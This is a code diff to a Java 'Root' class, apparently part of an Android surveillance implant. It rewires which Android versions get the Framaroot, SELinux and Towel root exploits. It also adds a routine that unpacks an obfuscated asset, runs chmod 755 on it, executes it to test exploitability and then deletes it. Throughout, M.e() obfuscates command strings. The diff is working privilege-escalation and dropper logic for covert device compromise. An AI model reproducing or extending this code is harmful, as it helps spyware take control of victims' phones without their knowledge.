@@ -66,12 +66,12 @@ public class Root {
 				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO -
 			// HONEYCOMB_MR2
 			ret = !checkFramarootExploitability();
-		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH
+		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 16) { // ICE_CREAM_SANDWICH
 			// -
 			// JELLY_BEAN_MR1
 			ret = !(checkFramarootExploitability() || checkSELinuxExploitability());
-		} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
-			ret = !checkSELinuxExploitability();
+		} else if (android.os.Build.VERSION.SDK_INT >= 17 && android.os.Build.VERSION.SDK_INT <= 18) { // JELLY_BEAN_MR2
+			ret = !(checkSELinuxExploitability() || checkTowelExploitability());
 		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
 			ret = !checkTowelExploitability();
 		}
@@ -125,7 +125,7 @@ public class Root {
 			linuxExploit(synchronous, true, false, false);
 			return true;
 
-		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH
+		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 16) { // ICE_CREAM_SANDWICH
 			// -
 			// JELLY_BEAN_MR1
 			if (Cfg.DEBUG) {
@@ -136,12 +136,12 @@ public class Root {
 			linuxExploit(synchronous, true, true, false);
 			return true;
 
-		} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
+		} else if (android.os.Build.VERSION.SDK_INT >= 17 && android.os.Build.VERSION.SDK_INT <= 18) { // JELLY_BEAN_MR2
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): Android 4.3 detected attempting SELinux exploitation");
 			}
 
-			linuxExploit(synchronous, false, true, false);
+			linuxExploit(synchronous, false, true, true);
 			return true;
 
 		} else if (android.os.Build.VERSION.SDK_INT == 19) { // KITKAT+
@@ -488,6 +488,49 @@ public class Root {
 		try {
 			// preprocess/selinux_check
 			Utils.dumpAsset(M.e("db.data"), exploitCheck);
+			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
+			int ret = Execute.execute(path + M.e("/ecs")).exitCode;
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (checkExploitability) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/ecs"
+						+ " ret: " + ret);
+			}
+
+			File file = new File(Status.getAppContext().getFilesDir(), exploitCheck);
+			file.delete();
+
+			return ret > 0 ? true : false;
+		} catch (final Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(e1);//$NON-NLS-1$
+				Check.log(TAG + " (checkExploitability): Exception"); //$NON-NLS-1$
+			}
+
+			return false;
+		}
+	}
+
+
+	public static boolean checkTowelExploitability() {
+		final File filesPath = Status.getAppContext().getFilesDir();
+		final String path = filesPath.getAbsolutePath();
+		final String exploitCheck = M.e("ecs"); // ecs
+
+		if (checkCyanogenmod()) {
+			return false;
+		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (checkTowelExploitability) ");
+		}
+
+		try {
+			// preprocess/selinux_check
+			Utils.dumpAsset(M.e("nb.data"), exploitCheck);
 			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
 			int ret = Execute.execute(path + M.e("/ecs")).exitCode;
 
@@ -902,7 +945,4 @@ public class Root {
 		return 1;
 	}
 
-	public static boolean checkTowelExploitability() {
-		return false;
-	}
 }
